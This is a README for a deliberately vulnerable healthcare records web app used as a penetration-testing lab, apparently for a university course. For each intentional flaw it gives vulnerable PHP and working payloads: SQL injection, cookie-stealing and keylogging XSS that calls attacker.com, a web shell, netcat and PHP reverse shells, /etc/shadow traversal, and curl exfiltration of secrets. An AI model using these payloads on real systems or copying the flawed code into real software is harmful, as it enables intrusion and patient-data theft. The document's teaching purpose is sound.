# MedCare Health System - Vulnerable EHR Web Application

## ⚠️ SECURITY WARNING

**This application contains INTENTIONAL security vulnerabilities for educational and penetration testing purposes.**

- **DO NOT deploy in production**
- **DO NOT use with real patient data**
- **DO NOT connect to the internet**
- **Use only in isolated lab environments**

---

## 📋 Overview

MedCare Health System is a deliberately vulnerable Electronic Health Record (EHR) web application designed for security testing, red team exercises, and cybersecurity training. It simulates a realistic healthcare portal with common vulnerabilities found in legacy systems.

### Technology Stack
- **Backend**: PHP 8.1 with Apache
- **Database**: MySQL 8.0
- **Frontend**: HTML5, CSS3, Bootstrap (inline)
- **Container**: Docker

---

## 🚀 Quick Start

### Prerequisites
- Docker and Docker Compose installed
- Port 8080 available

### Deployment

1. **Build the container**:
```bash
cd docker-lab/services/ehr-webapp
docker build -t ehr-webapp .
```

2. **Run with MySQL**:
```bash
docker-compose up -d
```

3. **Initialize database**:
```bash
docker exec -i mysql_container mysql -uroot -proot123 < init-db.sql
```

4. **Access the application**:
```
http://localhost:8080
```

### Default Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | Administrator |
| doctor1 | doctor123 | Doctor |
| nurse1 | nurse123 | Nurse |
| patient1 | patient123 | Patient |
| test | test | Patient |

---

## 🎯 Intentional Vulnerabilities

### 1. SQL Injection (SQLi)

**Location**: Multiple endpoints
**Severity**: CRITICAL

#### Vulnerable Code Examples:

**Login Page** (`index.php`):
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Patient Search** (`search.php`):
```php
$query = "SELECT * FROM patients WHERE first_name LIKE '%$search%' OR last_name LIKE '%$search%'";
```

#### Exploitation:

**Bypass Authentication**:
```
Username: admin' OR '1'='1' -- 
Password: anything
```

**Union-based SQLi** (Patient Search):
```
' UNION SELECT id,username,password,email,role,created_at,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users -- 
```

**Blind SQLi**:
```
' AND (SELECT SLEEP(5)) -- 
```

**Extract Database Schema**:
```
' UNION SELECT 1,table_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM information_schema.tables WHERE table_schema='medcare_ehr' -- 
```

**Dump All Passwords**:
```
' UNION SELECT id,username,password,email,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 FROM users -- 
```

---

### 2. Broken Authentication

**Location**: Login system
**Severity**: CRITICAL

#### Vulnerabilities:
- Passwords stored in **plain text** (no hashing)
- No account lockout after failed attempts
- No MFA/2FA
- Predictable session IDs
- No password complexity requirements

#### Exploitation:

**Brute Force Attack**:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"
```

**Database Direct Access**:
```sql
SELECT username, password FROM users;
```

**Session Hijacking**:
- Copy `PHPSESSID` cookie from another user
- No session validation or IP binding

---

### 3. Insecure Direct Object Reference (IDOR)

**Location**: `dashboard.php`
**Severity**: HIGH

#### Vulnerable Code:
```php
$patient_id = $_GET['patient_id'];
$query = "SELECT * FROM patients WHERE id = $patient_id";
// No authorization check!
```

#### Exploitation:

Access any patient record without authorization:
```
http://localhost:8080/dashboard.php?patient_id=1
http://localhost:8080/dashboard.php?patient_id=2
http://localhost:8080/dashboard.php?patient_id=3
...
```

**Automated Enumeration**:
```bash
for i in {1..20}; do
  curl -s "http://localhost:8080/dashboard.php?patient_id=$i" -b "PHPSESSID=your_session" | grep "SSN"
done
```

---

### 4. Cross-Site Scripting (XSS)

**Location**: `dashboard.php` - Medical Notes field
**Severity**: HIGH

#### Vulnerable Code:
```php
echo $patient_data['medical_notes']; // No sanitization!
```

#### Exploitation:

**Stored XSS** (Patient ID 20):
```html
<script>alert('XSS Vulnerability')</script>
```

**Cookie Theft**:
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

**Keylogger**:
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

---

### 5. Unrestricted File Upload

**Location**: `upload.php`
**Severity**: CRITICAL

#### Vulnerabilities:
- No file type validation
- No file size limits
- No content inspection
- Direct file execution possible

#### Exploitation:

**PHP Web Shell Upload**:

Create `shell.php`:
```php
<?php
system($_GET['cmd']);
?>
```

Upload via web interface, then access:
```
http://localhost:8080/uploads/shell.php?cmd=whoami
http://localhost:8080/uploads/shell.php?cmd=cat+/etc/passwd
http://localhost:8080/uploads/shell.php?cmd=ls+-la
```

**Reverse Shell**:
```php
<?php
$sock=fsockopen("attacker-ip",4444);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

---

### 6. Directory Traversal / Path Traversal

**Location**: `settings.php`
**Severity**: CRITICAL

#### Vulnerable Code:
```php
$file_path = $_GET['file'];
$file_content = file_get_contents($file_path); // No sanitization!
```

#### Exploitation:

**Read Sensitive Files**:
```
http://localhost:8080/settings.php?file=.env
http://localhost:8080/settings.php?file=/etc/passwd
http://localhost:8080/settings.php?file=/etc/shadow
http://localhost:8080/settings.php?file=../../../etc/hosts
http://localhost:8080/settings.php?file=/var/log/apache2/access.log
```

**Read Database Credentials**:
```
http://localhost:8080/settings.php?file=.env.example
```

**Read Source Code**:
```
http://localhost:8080/settings.php?file=index.php
http://localhost:8080/settings.php?file=dashboard.php
```

---

### 7. Command Injection

**Location**: `settings.php` - Network Diagnostics
**Severity**: CRITICAL

#### Vulnerable Code:
```php
$host = $_GET['ping'];
$result = shell_exec("ping -c 3 " . $host);
```

#### Exploitation:

**Command Chaining**:
```
http://localhost:8080/settings.php?ping=localhost;whoami
http://localhost:8080/settings.php?ping=localhost;cat+/etc/passwd
http://localhost:8080/settings.php?ping=localhost;ls+-la+/var/www/html
```

**Reverse Shell**:
```
http://localhost:8080/settings.php?ping=localhost;nc+-e+/bin/bash+attacker-ip+4444
```

**Data Exfiltration**:
```
http://localhost:8080/settings.php?ping=localhost;curl+http://attacker.com/$(cat+.env.example|base64)
```

---

### 8. Information Disclosure

**Location**: Multiple files
**Severity**: MEDIUM to HIGH

#### Examples:

**PHP Info**:
```
http://localhost:8080/index.php?info=1
http://localhost:8080/settings.php?phpinfo=1
```

**Database Credentials Exposed**:
```
http://localhost:8080/settings.php
```
(Credentials displayed in plain text)

**Verbose Error Messages**:
- SQL errors show full queries
- File paths disclosed in error messages
- Stack traces visible

**HTML Comments**:
```html
<!-- Debug Query: SELECT * FROM users WHERE username = 'admin' -->
<!-- Debug: Add ?info=1 to see phpinfo() -->
```

---

### 9. Weak Session Management

**Severity**: MEDIUM

#### Vulnerabilities:
- No session timeout enforcement
- Session ID in URL possible
- No session regeneration after login
- No HTTP-only flag on cookies
- No Secure flag (if HTTPS)

#### Exploitation:

**Session Fixation**:
```
http://localhost:8080/index.php?PHPSESSID=attacker_chosen_id
```

**Session Cookie Theft via XSS**:
```javascript
document.location='http://attacker.com/?cookie='+document.cookie;
```

---

### 10. Missing Access Controls

**Location**: Multiple endpoints
**Severity**: HIGH

#### Vulnerabilities:
- API endpoints accessible without authentication
- No role-based access control (RBAC)
- Admin functions accessible to regular users
- No CSRF protection

#### Exploitation:

**Unauthenticated Access**:
```
http://localhost:8080/search.php (No login required)
http://localhost:8080/api.php (API documentation public)
```

**Privilege Escalation**:
```sql
-- Register as admin via SQL injection
' ; UPDATE users SET role='admin' WHERE username='attacker' -- 
```

---

### 11. Mass Assignment / Parameter Tampering

**Location**: `register.php`
**Severity**: MEDIUM

#### Exploitation:

Create admin account during registration:
```html
<form method="POST" action="register.php">
  <input name="username" value="hacker">
  <input name="password" value="hacked">
  <input name="email" value="hacker@evil.com">
  <input name="role" value="admin">  <!-- Escalate to admin! -->
  <input type="submit">
</form>
```

---

### 12. Sensitive Data Exposure

**Location**: Database and exports
**Severity**: CRITICAL

#### Vulnerabilities:
- SSN stored in plain text
- No encryption at rest
- No encryption in transit (HTTP)
- CSV export with full PII

#### Exploitation:

**Export All Patient Data**:
```
http://localhost:8080/reports.php?export=csv
```
Downloads complete database with SSNs, medical records, etc.

---

## 🔴 Attack Scenarios

### Scenario 1: Complete System Compromise

1. **Reconnaissance**:
   ```
   http://localhost:8080/api.php
   http://localhost:8080/index.php?info=1
   ```

2. **SQL Injection to Extract Credentials**:
   ```
   Search: ' UNION SELECT id,username,password,email,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM users -- 
   ```

3. **Login as Admin**:
   ```
   Username: admin
   Password: admin123
   ```

4. **Upload Web Shell**:
   Upload `shell.php` via `upload.php`

5. **Command Execution**:
   ```
   http://localhost:8080/uploads/shell.php?cmd=cat+.env.example
   ```

6. **Establish Persistence**:
   Create backdoor account via command execution

---

### Scenario 2: Data Exfiltration

1. **Bypass Authentication** (SQL Injection)
2. **Access All Patient Records** (IDOR):
   ```bash
   for i in {1..20}; do
     curl "http://localhost:8080/dashboard.php?patient_id=$i"
   done
   ```
3. **Export Complete Database**:
   ```
   http://localhost:8080/reports.php?export=csv
   ```

---

### Scenario 3: Lateral Movement

1. **Compromise Web Application**
2. **Read Credentials** from `.env.example`
3. **Connect to Database**:
   ```bash
   mysql -h localhost -u webapp -pwebapp123 medcare_ehr
   ```
4. **Pivot to Other Systems** using discovered credentials

---

## 🛠️ Testing Tools

### Recommended Tools:

**Web Vulnerability Scanners**:
- Burp Suite Professional
- OWASP ZAP
- Nikto
- sqlmap

**SQL Injection**:
```bash
sqlmap -u "http://localhost:8080/search.php?search=test" --batch --dump
```

**Directory Brute Force**:
```bash
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt
```

**Password Attacks**:
```bash
hydra -L users.txt -P passwords.txt localhost -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid"
```

**XSS Detection**:
```bash
xsser -u "http://localhost:8080/search.php?search=XSS"
```

---

## 📊 Application Features

### Patient Management
- Patient demographics (20 synthetic records)
- Medical history and notes
- Search functionality
- Patient detail views

### User Management
- Multi-role support (admin, doctor, nurse, patient)
- User registration
- Session management

### File Management
- Document upload
- File listing
- Direct file access

### Reporting
- Patient lists
- Insurance reports
- CSV export

### System Tools (Admin)
- File viewer
- Network diagnostics
- System information
- Database configuration viewer

---

## 🗂️ File Structure

```
ehr-webapp/
├── Dockerfile
├── README.md
├── init-db.sql
├── .env.example
└── src/
    ├── index.php          # Login page (SQLi vulnerable)
    ├── dashboard.php      # Main dashboard (IDOR, XSS)
    ├── search.php         # Patient search (SQLi)
    ├── register.php       # User registration
    ├── upload.php         # File upload (unrestricted)
    ├── reports.php        # Reporting (data exposure)
    ├── settings.php       # Admin tools (LFI, RCE)
    ├── api.php            # API documentation
    ├── logout.php         # Logout handler
    └── uploads/           # Uploaded files directory
```

---

## 🎓 Learning Objectives

This application helps practice:

1. **Web Application Security Testing**
   - SQL Injection techniques
   - Authentication bypass
   - Authorization flaws
   - Input validation issues

2. **OWASP Top 10**
   - A01: Broken Access Control
   - A02: Cryptographic Failures
   - A03: Injection
   - A07: Identification and Authentication Failures
   - A08: Software and Data Integrity Failures

3. **Healthcare-Specific Security**
   - HIPAA compliance gaps
   - PHI/PII protection
   - Medical record access controls
   - Audit logging requirements

4. **Penetration Testing Methodology**
   - Reconnaissance
   - Vulnerability discovery
   - Exploitation
   - Post-exploitation
   - Privilege escalation
   - Data exfiltration

---

## 🔐 Secure Alternatives (What NOT to do)

### ❌ Current Implementation → ✅ Secure Implementation

1. **Plain Text Passwords**:
   ```php
   // BAD
   $password = $_POST['password'];
   
   // GOOD
   $password = password_hash($_POST['password'], PASSWORD_BCRYPT);
   ```

2. **SQL Injection**:
   ```php
   // BAD
   $query = "SELECT * FROM users WHERE username = '$username'";
   
   // GOOD
   $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
   $stmt->bind_param("s", $username);
   ```

3. **XSS**:
   ```php
   // BAD
   echo $user_input;
   
   // GOOD
   echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
   ```

4. **File Upload**:
   ```php
   // BAD
   move_uploaded_file($tmp, $target);
   
   // GOOD
   - Whitelist allowed extensions
   - Verify MIME type
   - Rename files
   - Store outside webroot
   - Scan for malware
   ```

5. **IDOR**:
   ```php
   // BAD
   $patient_id = $_GET['id'];
   
   // GOOD
   - Check user permissions
   - Verify ownership
   - Use indirect references
   ```

---

## 📈 Logging and Monitoring

The application logs access attempts to:
- `uploads/upload_log.txt` - File uploads
- Apache access logs - HTTP requests
- PHP error logs - Application errors

**Note**: Logging is intentionally incomplete and verbose for testing purposes.

---

## 🐳 Docker Configuration

### Environment Variables

Set these in Docker Compose or container runtime:
```
DB_HOST=db
DB_NAME=medcare_ehr
DB_USER=webapp
DB_PASS=webapp123
```

### Volume Mounts

```yaml
volumes:
  - ./uploads:/var/www/html/uploads  # Persistent file storage
  - ./logs:/var/log/apache2          # Access logs
```

---

## 🔬 Database Schema

### Tables:
- `users` - Healthcare staff accounts
- `patients` - Patient demographics and PHI
- `medical_records` - Medical history
- `appointments` - Scheduling data
- `audit_log` - Access audit trail (incomplete)

### Sample Data:
- 10 users (various roles)
- 20 patients (synthetic HIPAA-compliant data)
- Medical records and appointments

---

## ⚖️ Legal and Ethical Considerations

### ✅ Authorized Use Cases:
- Security training and education
- Penetration testing practice
- Vulnerability research
- Red team exercises
- Cybersecurity course labs

### ❌ Prohibited Use:
- Deployment with real patient data
- Internet-facing deployment
- Unauthorized access to systems
- Illegal activities

### Data Privacy:
All patient data is **synthetic and fake**. No real PHI/PII is included.

---

## 🆘 Troubleshooting

### Database Connection Errors
```bash
# Verify database is running
docker ps | grep db

# Check environment variables
docker exec ehr-webapp env | grep DB_

# Test database connection
docker exec db mysql -uwebapp -pwebapp123 -e "SHOW DATABASES;"
```

### File Upload Permissions
```bash
# Fix upload directory permissions
docker exec ehr-webapp chmod 777 /var/www/html/uploads
```

### PHP Errors Not Displaying
```bash
# Verify PHP configuration
docker exec ehr-webapp php -i | grep display_errors
```

---

## 📚 Additional Resources

### OWASP
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### MITRE ATT&CK
- See `MITRE_ATTACK_MAPPING.md` for detailed technique mappings

### HIPAA Security
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/)
- [OCR Cybersecurity Guidance](https://www.hhs.gov/about/agencies/ocr/cybersecurity/index.html)

---

## 🤝 Contributing

This is an educational project. Contributions welcome:
- Additional vulnerabilities
- Improved documentation
- New attack scenarios
- Bug fixes (for unintentional bugs, not intentional vulns!)

---

## 📞 Support

For questions or issues with the lab environment, please refer to:
- `PROJECT_SUMMARY.md` - Project overview
- `SETUP_GUIDE.md` - Detailed setup instructions
- `VULNERABILITY_DOCUMENTATION.md` - Complete vuln catalog

---

## 📜 License

This project is for educational purposes only. Use responsibly and ethically.

**Copyright © 2024 Project Medusa | University of Washington INFO 492**

---

## ⚠️ Final Reminder

**This application is INTENTIONALLY INSECURE. Never use in production or with real data.**

Happy ethical hacking! 🎯

